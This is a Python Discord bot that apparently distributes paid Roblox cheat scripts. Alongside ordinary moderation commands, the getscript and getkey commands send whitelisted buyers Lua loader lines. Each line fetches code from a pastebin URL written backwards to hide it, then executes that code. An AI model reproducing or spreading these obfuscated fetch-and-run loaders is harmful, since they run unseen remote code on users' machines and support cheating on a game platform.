import discord
import os
import asyncio
import discord.utils
import shutil
import datetime
import link
import time
from discord.ext.commands import Bot
from discord.ext import commands, tasks
from itertools import cycle
from discord.utils import get
from os import system

client = commands.Bot(command_prefix = '!')
status = cycle(['Roblox','HUB','Script'])

@client.event
async def on_ready():
    change_status.start()
    await client.change_presence(status=discord.Status.idle, activity=discord.Game('getrenv()#1430'))
    print('Logged in as {0} ({0.id})'.format(client.user))
    print('-------------------------------')

@tasks.loop(seconds=2)
async def change_status():
    await client.change_presence(activity=discord.Game(next(status)))

@client.command()
async def getShirt(ctx):
    channel = client.get_channel(677040654366277642)
    author=ctx.message.author
    em5 = discord.Embed(
        colour=discord.Colour.blue(),
        timestamp=ctx.message.created_at
    )
    em5.set_author(name="HUB")
    em5.set_thumbnail(url=author.avatar_url)
    em5.add_field(name=f"Via T-Shirt (5,715R$ AfterTax) (DM getgenv()#1430)", value=f'`https://www.roblox.com/catalog/2391036631/HUB`', inline=False)
    em5.set_footer(text=f'Requested By: {ctx.author.id} | {ctx.author} | SHIRT', icon_url=ctx.author.avatar_url)
    await author.send(embed=em5)
    await channel.send(embed=em5)

@client.command()
async def getGroup(ctx):
    channel = client.get_channel(677040654366277642)
    author=ctx.message.author
    em6 = discord.Embed(
        colour=discord.Colour.blue(),
        timestamp=ctx.message.created_at
    )
    em6.set_author(name="HUB")
    em6.set_thumbnail(url=author.avatar_url)
    em6.add_field(name=f"Via Group Funds (4K R$)", value=f'`DM getgenv()#1430`', inline=False)
    em6.set_footer(text=f'Requested By: {ctx.author.id} | {ctx.author} | SHIRT', icon_url=ctx.author.avatar_url)
    await author.send(embed=em6)
    await channel.send(embed=em6)

@client.command()
async def avatar(ctx, member: discord.Member):
    em7 = discord.Embed(
      colour=discord.Colour.blue()
    )
    em7.set_image(url=member.avatar_url)
    await ctx.send(embed=em7)

def ListId(ctx):
  return ctx.author.id in (461017159011663872,393106685788422145,161864891647524864,313814906564640768,161864891647524864,263004323041116162,161027919177580544,313814906564640768,519741680354721809,493222823217725440,514585766190383124,413364967073382401,310619305823830017,413364967073382401,453086807135879169,396737882615971842,310029852470280193,386688147326763028,297825550943256576,353721724023603202,582732254841667603,244556185372459009)

@client.command()
@commands.check(ListId)
async def getrole(ctx, * role: discord.Role):
  channel = client.get_channel(677040654366277642)
  user = ctx.message.author
  role = discord.utils.get(user.guild.roles, name=f"Whitelisted")
  await user.add_roles(role)
  em1 = discord.Embed(
    colour=discord.Colour.blue(),
    timestamp=ctx.message.created_at
  )
  em1.set_author(name=f'HUB')
  em1.set_thumbnail(url=user.avatar_url)
  em1.add_field(name=f'Success!', value=f'You are now whitelisted!', inline=False)
  em1.set_footer(text=f'Requested By: {ctx.author.id} | {ctx.author} | WHITELIST', icon_url=ctx.author.avatar_url)
  await ctx.send(embed=em1)
  await channel.send(embed=em1)

@client.command()
@commands.check(ListId)
async def getscript(ctx):
    author=ctx.message.author
    channel = client.get_channel(677040654366277642)
    em2 = discord.Embed(
      colour=discord.Colour.blue(),
      timestamp=ctx.message.created_at
    )
    em2.set_author(name=f'HUB')
    em2.set_thumbnail(url=author.avatar_url)
    em2.add_field(name=f'Script', value=f"`script=loadstring(game:HttpGet(('c5Uz2aZ4/war/moc.nibetsap//:sptth'):reverse(), true))()`", inline=False)
    em2.set_footer(text=f'Requested By: {ctx.author.id} | {ctx.author} | SCRIPT', icon_url=ctx.author.avatar_url)
    await author.send(embed=em2)
    await channel.send(embed=em2)

@client.command()
@commands.check(ListId)
async def getkey(ctx):
    author=ctx.message.author
    channel = client.get_channel(677040654366277642)
    em2 = discord.Embed(
      colour=discord.Colour.blue(),
      timestamp=ctx.message.created_at
    )
    em2.set_author(name=f'HUB')
    em2.set_thumbnail(url=author.avatar_url)
    em2.add_field(name=f'Key', value=f"`script=loadstring(game:HttpGet(('32XbPpDX/war/moc.nibetsap//:sptth'):reverse(), true))()`", inline=False)
    em2.set_footer(text=f'Requested By: {ctx.author.id} | {ctx.author} | KEY', icon_url=ctx.author.avatar_url)
    await author.send(embed=em2)
    await channel.send(embed=em2)

@client.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount : int):
    await ctx.channel.purge(limit=amount)

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        em3 = discord.Embed(
            colour=discord.Colour.blue()
        )
        em3.set_author(name="HUB")
        em3.add_field(name="Error! - 1", value='Wrong command', inline=False)
        await ctx.send(embed=em3)

@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        em4 = discord.Embed(
            colour=discord.Colour.blue()
        )
        em4.set_author(name="HUB")
        em4.add_field(name="Error! - 2", value='Wrong command, Try again', inline=False)
        await ctx.send(embed=em4)

@client.command()
async def ping(ctx):
    em13 = discord.Embed(
        colour=discord.Colour.blue()
    )
    em13.set_author(name="HUB")
    em13.add_field(name="Ping!", value=f'{round(client.latency * 1000)}ms', inline=False)
    em13.set_footer(text=f'Requested By: {ctx.author.id}', icon_url=ctx.author.avatar_url)
    await ctx.send(embed=em13)

@client.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    em22 = discord.Embed(
      colour=discord.Colour.blue()
    )
    em22.add_field(name=f'Success!', value=f'{member.mention} Kicked!', inline=False)
    em22.set_footer(text=f'Requested By: {ctx.author.id}', icon_url=ctx.author.avatar_url)
    await ctx.send(embed=em22)

@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member : discord.Member, *, reason=None):
    await member.ban(reason=reason)
    em23 = discord.Embed(
      colour=discord.Colour.blue()
    )
    em23.add_field(name=f'Success!', value=f'{member.mention} Banned', inline=False)
    em23.set_footer(text=f'Requested By: {ctx.author.id}', icon_url=ctx.author.avatar_url)
    await ctx.send(embed=em23)

@client.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, *, member):
    banned_users = await ctx.guild.bans()
    member_name, member_discriminator = member.split('#')

    for ban_entry in banned_users:
        user = ban_entry.user

        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            em18 = discord.Embed(
                colour=discord.Colour.blue()
            )
            em18.add_field(name=f'Success!', value=f'Unbanned {user.name}#{user.discriminator}', inline=False)
            await ctx.send(embed=em18)
            # await ctx.send(f'> Unbanned `{user.name}#{user.discriminator}`')
            return

@client.command()
async def getinfo(ctx, member: discord.Member):
    roles=[role for role in member.roles]
    em19 = discord.Embed(
        colour=member.color, timestamp=ctx.message.created_at
    )
    em19.set_author(name=f'User Infomation - {member}')
    em19.set_thumbnail(url=member.avatar_url)
    em19.set_footer(text=f'Requested By: {ctx.author}', icon_url=ctx.author.avatar_url)
    em19.add_field(name='Discord ID:', value=member.id, inline=False)
    em19.add_field(name='Guild Name:', value=member.display_name, inline=False)
    em19.add_field(name='Account Created:', value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p"), inline=False)
    em19.add_field(name='Joined:', value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p"), inline=False)
    em19.add_field(name=f'Roles ({len(roles)})', value=" ".join([role.mention for role in roles]), inline=False)
    em19.add_field(name='Top Role:', value=member.top_role.mention, inline=False)
    em19.add_field(name='HUB', value=member.bot, inline=False)
    await ctx.send(embed=em19)

TOKEN = os.environ.get('DISCORD_BOT_SECRET')
client.run(TOKEN)
